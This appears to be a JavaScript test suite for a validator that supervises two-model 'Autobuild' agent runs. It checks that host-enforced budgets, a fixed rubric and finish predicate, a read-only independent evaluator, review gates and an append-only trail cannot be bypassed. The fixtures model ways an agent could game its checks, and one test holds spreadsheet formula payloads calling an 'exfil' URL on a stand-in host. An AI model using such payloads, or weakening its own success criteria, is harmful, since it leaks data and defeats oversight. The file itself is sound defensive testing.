/**
 * Tests for the issue #28 Autobuild run.
 *
 * The issue's mandatory list is nine scenarios, and they share a shape: the run
 * is supposed to stop, and the question is whether anything other than the
 * model's own judgement makes it.
 */

import assert from "node:assert/strict";
import test from "node:test";

import {
  APPROVAL_COVERS,
  CONTRACT_EXAMPLE_PATH,
  CONTRACT_MARKER,
  CONTRACT_PATH,
  CONTRACT_SCHEMA_PATH,
  FORMULA_PREFIXES,
  RECORD_EXAMPLE_PATH,
  RECORD_SCHEMA_PATH,
  REFUSALS,
  REFUSED_EXAMPLE_PATH,
  autobuildDesignDigest,
  contractDigest,
  improved,
  loadFiles,
  rubricScore,
  trailErrors,
  validateAutobuildDesign,
  validateContract,
  validateRun,
} from "../scripts/validate-autobuild-run.mjs";

const files = loadFiles();
const contractSchema = JSON.parse(files[CONTRACT_SCHEMA_PATH]);
const recordSchema = JSON.parse(files[RECORD_SCHEMA_PATH]);

const contract = () => JSON.parse(files[CONTRACT_EXAMPLE_PATH]);
const run = () => JSON.parse(files[RECORD_EXAMPLE_PATH]);
const refusedRun = () => JSON.parse(files[REFUSED_EXAMPLE_PATH]);

function mutated(mutate, base = run) {
  const value = base();
  mutate(value);
  return value;
}

function assertRefuses(record, pattern, withContract = contract()) {
  const errors = validateRun(record, withContract, recordSchema);
  assert.ok(
    errors.some((message) => pattern.test(message)),
    `expected an error matching ${pattern}, got:\n${errors.join("\n") || "(none)"}`,
  );
}

test("the shipped design validates", () => {
  assert.deepEqual(validateAutobuildDesign(files), []);
});

test("the worked run is a complete, approved, finished run", () => {
  assert.deepEqual(validateContract(contract(), contractSchema), []);
  assert.deepEqual(validateRun(run(), contract(), recordSchema), []);
});

test("nothing starts without an approved contract digest", () => {
  // Approval is of a digest: one that does not name the bytes it approved
  // cannot be checked against the bytes that ran.
  const tampered = contract();
  tampered.limits.max_sprints = 60;
  assert.ok(
    validateContract(tampered, contractSchema).some((message) => /autobuild_no_approved_contract/u.test(message)),
  );
  assertRefuses(
    mutated((value) => {
      value.contract_digest = "9".repeat(64);
    }),
    /autobuild_no_approved_contract: the run cites/u,
  );
});

test("a run records what opted it in", () => {
  assert.ok(recordSchema.required.includes("opt_in"));
  assert.deepEqual(recordSchema.properties.opt_in.properties.kind.enum, ["user_request", "approved_project_policy"]);
});

test("the rubric may not move once the result has been seen", () => {
  // In the artifact, relaxing a criterion after the fact is indistinguishable
  // from having chosen a better one.
  assertRefuses(
    mutated((value) => {
      value.sprints[2].contract_digest = "1".repeat(64);
    }),
    /autobuild_rubric_mutated: abs-0003 ran under/u,
  );
  const relaxed = contract();
  relaxed.rubric.criteria[1].statement = "the reads mostly return whole runes";
  assert.ok(validateContract(relaxed, contractSchema).some((message) => /rubric digest does not recompute/u.test(message)));
  const toothless = contract();
  for (const criterion of toothless.rubric.criteria) criterion.non_negotiable = false;
  assert.ok(
    validateContract(toothless, contractSchema).some((message) => /cannot fail a run/u.test(message)),
  );
});

test("a sprint that scores an unknown or an incomplete rubric is refused", () => {
  assertRefuses(
    mutated((value) => {
      value.sprints[0].rubric_scores[0].criterion_id = "invented-criterion";
    }),
    /scores unknown criterion invented-criterion/u,
  );
  assertRefuses(
    mutated((value) => {
      value.sprints[0].rubric_scores.pop();
    }),
    /does not score every criterion/u,
  );
});

test("the finish predicate is never weakened to declare success", () => {
  assertRefuses(
    mutated((value) => {
      value.sprints[2].finish_predicate_digest = "2".repeat(64);
    }),
    /autobuild_predicate_weakened: abs-0003 cites another finish predicate/u,
  );
  assertRefuses(
    mutated((value) => {
      value.sprints[2].rubric_scores[1].met = false;
    }),
    /finished with chunk-boundaries unmet/u,
  );
  const drifted = contract();
  drifted.finish_predicate.statement = "until the feature is good enough for now";
  assert.ok(validateContract(drifted, contractSchema).some((message) => /autobuild_predicate_weakened/u.test(message)));
});

test("budgets are host-side, as a const and not as a preference", () => {
  assert.equal(contractSchema.properties.enforcement.properties.budgets_enforced_by.const, "host");
  assertRefuses(
    mutated((value) => {
      value.stop.enforced_by = "model";
    }),
    /stopped by the model, not by the host/u,
  );
});

test("each budget stops the run: sprints, wall clock, cost, tokens, restarts", () => {
  for (const [field, over] of [
    ["sprints", 99],
    ["wall_clock_ms", 999999999],
    ["cost_units", 99999],
    ["tokens", 999999999],
    ["restarts", 9],
  ]) {
    assertRefuses(
      mutated((value) => {
        value.spent[field] = over;
      }),
      new RegExp(`autobuild_budget_exceeded: ${field}`, "u"),
    );
  }
});

test("consecutive non-improvement is computed, not judged", () => {
  const base = contract();
  const record = run();
  assert.ok(rubricScore(base, record.sprints[2]) > rubricScore(base, record.sprints[1]));
  assert.equal(improved(base, record.sprints[1], record.sprints[0]), false);
  assert.equal(improved(base, record.sprints[0], undefined), true);
  assertRefuses(
    mutated((value) => {
      value.spent.consecutive_non_improving = 0;
      value.sprints[1].outcome = "improved";
    }),
    /records improved, computed no_improvement/u,
  );
});

test("a run may not cite the approved contract at another version", () => {
  // Same bytes, different version, is a contract nobody approved: the digest
  // check and the version check catch different edits.
  assertRefuses(
    mutated((value) => {
      value.contract_version = value.contract_version + 1;
    }),
    /autobuild_rubric_mutated: the run's contract version is not the approved one/u,
  );
});

test("a contract that leaves enforcement to the model is refused where it is read", () => {
  // The schema's const stops this in the shipped path, so without a direct test
  // the guard inside `validateRun` would never be evaluated — and `validateRun`
  // is exported, so something else may reach it with the schema out of the way.
  const asked = contract();
  asked.enforcement.budgets_enforced_by = "model";
  assertRefuses(run(), /a budget the model is asked to respect is a request/u, asked);
});

test("the recorded non-improvement counter must equal the computed one", () => {
  assertRefuses(
    mutated((value) => {
      value.spent.consecutive_non_improving = 2;
    }),
    /autobuild_no_progress_cap: recorded 2, computed 0/u,
  );
});

test("the non-improvement cap stops the run", () => {
  assertRefuses(
    mutated((value) => {
      // Two sprints that changed nothing the rubric measures, and no stop.
      value.sprints = value.sprints.slice(0, 2);
      value.sprints[1].outcome = "no_improvement";
      value.sprints.push({
        ...value.sprints[1],
        sprint_id: "abs-0003",
        ticket_id: "T-203",
        outcome: "no_improvement",
      });
      value.spent.consecutive_non_improving = 2;
      value.stop = null;
    }),
    /2 non-improving sprints without a stop/u,
  );
});

test("the negotiation cap is a cap", () => {
  assertRefuses(
    mutated((value) => {
      value.spent.negotiation_rounds = 4;
    }),
    /autobuild_negotiation_cap: 4 rounds over 3/u,
  );
});

test("Generator and Evaluator are two parties", () => {
  // A pair that shares a family or a session is one party with two names.
  assertRefuses(
    mutated((value) => {
      value.parties.evaluator.family = value.parties.generator.family;
    }),
    /autobuild_pair_not_independent/u,
  );
  assertRefuses(
    mutated((value) => {
      value.parties.evaluator.session_id = value.parties.generator.session_id;
    }),
    /autobuild_pair_not_independent/u,
  );
});

test("the Evaluator is read-only by construction, and a write is refused", () => {
  assert.equal(recordSchema.properties.parties.properties.evaluator.properties.read_only.const, true);
  assertRefuses(
    mutated((value) => {
      value.sprints[1].evaluator_wrote = true;
    }),
    /autobuild_evaluator_wrote: abs-0002/u,
  );
});

test("the ordinary gates are not bypassed because the work came from Autobuild", () => {
  for (const gate of ["ticket_panel", "review", "aggregate_verification"]) {
    assertRefuses(
      mutated((value) => {
        value.sprints[0].gates[gate] = "not_run";
      }),
      new RegExp(`autobuild_gate_bypassed: abs-0001 ${gate} is not_run`, "u"),
    );
  }
  assertRefuses(
    mutated((value) => {
      value.sprints[0].gates.integration_receipt = null;
    }),
    /integrated without a receipt/u,
  );
});

test("a major discovery leaves through the revision path", () => {
  // A loop that absorbs a product decision as an implementation detail decides
  // it without anyone noticing that it was decided.
  assertRefuses(
    mutated((value) => {
      value.sprints[1].discovery = "major";
    }),
    /autobuild_major_discovery: abs-0002 continued without a revision/u,
  );
  const routed = mutated((value) => {
    value.sprints[1].discovery = "major";
    value.sprints[1].revision_ref = "rev-0009";
  });
  assert.deepEqual(validateRun(routed, contract(), recordSchema), []);
});

test("a duplicate sprint dispatch is recognised, not run twice", () => {
  assertRefuses(
    mutated((value) => {
      value.sprints[2].sprint_id = "abs-0001";
    }),
    /autobuild_sprint_replay: abs-0001 was dispatched twice/u,
  );
});

test("a stopped run is stopped, and an outage stops it", () => {
  // The survivor does not take over both jobs: a Generator that evaluates its
  // own output arrives by accident rather than by decision.
  assertRefuses(
    mutated((value) => {
      value.sprints[0].outcome = "stopped";
    }),
    /autobuild_run_continued_after_stop: abs-0002 follows a stopped sprint/u,
  );
  assertRefuses(
    mutated((value) => {
      value.sprints[2].outcome = "improved";
      value.stop = { reason: "party_outage", detail: "the evaluator session did not answer", enforced_by: "host" };
    }),
    /the run stopped with abs-0003 recorded as improved/u,
  );
  assertRefuses(
    mutated((value) => {
      value.stop = null;
    }),
    /abs-0003 is finished with no stop recorded/u,
  );
});

test("the trail is append-only, and an edit breaks the chain", () => {
  const edited = run().trail;
  edited[2].text = "a kinder description of the same finding";
  assert.ok(trailErrors(edited).some((message) => /does not chain to its predecessor/u.test(message)));
  const reordered = run().trail;
  [reordered[1], reordered[2]] = [reordered[2], reordered[1]];
  assert.ok(trailErrors(reordered).some((message) => /is in position/u.test(message)));
});

test("the trail is inert as data", () => {
  // Its strings are written by the two parties the run exists to supervise, and
  // it is exported and opened in a spreadsheet.
  for (const prefix of FORMULA_PREFIXES) {
    const trail = run().trail;
    trail[0].text = `${prefix}IMPORTDATA("https://example.invalid/exfil")`;
    assert.ok(
      trailErrors(trail).some((message) => /autobuild_trail_injection/u.test(message)),
      JSON.stringify(prefix),
    );
  }
});

test("the refused run is refused, and names more than one thing", () => {
  const findings = validateRun(refusedRun(), contract(), recordSchema);
  assert.ok(findings.length >= 8, findings.join("\n"));
  for (const pattern of [
    /autobuild_pair_not_independent/u,
    /autobuild_evaluator_wrote/u,
    /autobuild_gate_bypassed/u,
    /autobuild_rubric_mutated/u,
    /autobuild_predicate_weakened/u,
    /autobuild_major_discovery/u,
    /autobuild_negotiation_cap/u,
    /autobuild_budget_exceeded/u,
    /autobuild_trail_injection/u,
    /autobuild_run_continued_after_stop/u,
  ]) {
    assert.ok(findings.some((message) => pattern.test(message)), `${pattern} was not found`);
  }
});

test("approval covers the twelve things, and the schema is where that holds", () => {
  const required = new Set([...contractSchema.required, ...contractSchema.properties.limits.required]);
  for (const field of APPROVAL_COVERS) assert.ok(required.has(field), `${field} is optional`);
  const withoutOne = JSON.parse(files[CONTRACT_SCHEMA_PATH]);
  withoutOne.properties.limits.required = withoutOne.properties.limits.required.filter(
    (field) => field !== "max_negotiation_rounds",
  );
  assert.ok(
    validateAutobuildDesign({ ...files, [CONTRACT_SCHEMA_PATH]: JSON.stringify(withoutOne) }).some((message) =>
      /approval does not cover max_negotiation_rounds/u.test(message),
    ),
  );
});

test("the design checks fail when the shipped design stops satisfying them", () => {
  const broken = (path, transform) => validateAutobuildDesign({ ...files, [path]: transform(files[path]) });
  assert.ok(
    broken(CONTRACT_PATH, (text) => text.replace(CONTRACT_MARKER, "")).some((message) => /missing <!--/u.test(message)),
  );
  for (const schemaPath of [CONTRACT_SCHEMA_PATH, RECORD_SCHEMA_PATH]) {
    assert.ok(
      broken(CONTRACT_PATH, (text) => text.replaceAll(schemaPath, "elsewhere.json")).some((message) =>
        /does not point at/u.test(message),
      ),
    );
  }
  assert.ok(
    broken(CONTRACT_PATH, (text) => text.replaceAll("autobuild_trail_injection", "trail_bad")).some((message) =>
      /refusal autobuild_trail_injection is not documented/u.test(message),
    ),
  );
  for (const [sentence, expected] of [
    ["opt-in", /no default that starts a run/u],
    ["Approval is of a **digest**", /what approval is of/u],
    ["A budget the model is asked to respect is a request", /why budgets are host-side/u],
    ["one party with two names", /why the pair may not disposition/u],
  ]) {
    assert.ok(
      broken(CONTRACT_PATH, (text) => text.replaceAll(sentence, "")).some((message) => expected.test(message)),
      sentence,
    );
  }
});

test("the design checks fail when a schema stops closing what it must", () => {
  const withSchema = (relative, transform) => {
    const draft = JSON.parse(files[relative]);
    transform(draft);
    return validateAutobuildDesign({ ...files, [relative]: JSON.stringify(draft) });
  };
  for (const relative of [CONTRACT_SCHEMA_PATH, RECORD_SCHEMA_PATH]) {
    assert.ok(
      withSchema(relative, (draft) => {
        draft.additionalProperties = true;
      }).some((message) => /root must be closed/u.test(message)),
      relative,
    );
  }
  assert.ok(
    withSchema(CONTRACT_SCHEMA_PATH, (draft) => {
      draft.properties.enforcement.properties.budgets_enforced_by = { type: "string" };
    }).some((message) => /must be a const, not a preference/u.test(message)),
  );
  assert.ok(
    withSchema(RECORD_SCHEMA_PATH, (draft) => {
      draft.properties.parties.properties.evaluator.properties.read_only = { type: "boolean" };
    }).some((message) => /read-only by construction/u.test(message)),
  );
  assert.ok(
    withSchema(RECORD_SCHEMA_PATH, (draft) => {
      draft.required = draft.required.filter((field) => field !== "opt_in");
    }).some((message) => /must record what opted it in/u.test(message)),
  );
});

test("the design checks fail on an unparsable or an accepted refused example", () => {
  assert.ok(
    validateAutobuildDesign({ ...files, [REFUSED_EXAMPLE_PATH]: "{" }).some((message) => /not valid JSON/u.test(message)),
  );
  assert.ok(
    validateAutobuildDesign({ ...files, [REFUSED_EXAMPLE_PATH]: files[RECORD_EXAMPLE_PATH] }).some((message) =>
      /the refused example is accepted/u.test(message),
    ),
  );
  assert.ok(
    validateAutobuildDesign({ ...files, [CONTRACT_EXAMPLE_PATH]: "{" }).some((message) => /not valid JSON/u.test(message)),
  );
});

test("every refusal class is documented", () => {
  for (const refusal of REFUSALS) {
    assert.ok(files[CONTRACT_PATH].includes(refusal), `${refusal} is not documented`);
  }
});

test("the contract digest and the design digest both change with their inputs", () => {
  const before = contractDigest(contract());
  const after = contractDigest({ ...contract(), spec: `${contract().spec} and one more sentence` });
  assert.notEqual(before, after);
  assert.notEqual(
    autobuildDesignDigest(files),
    autobuildDesignDigest({ ...files, [CONTRACT_PATH]: `${files[CONTRACT_PATH]}\n` }),
  );
});
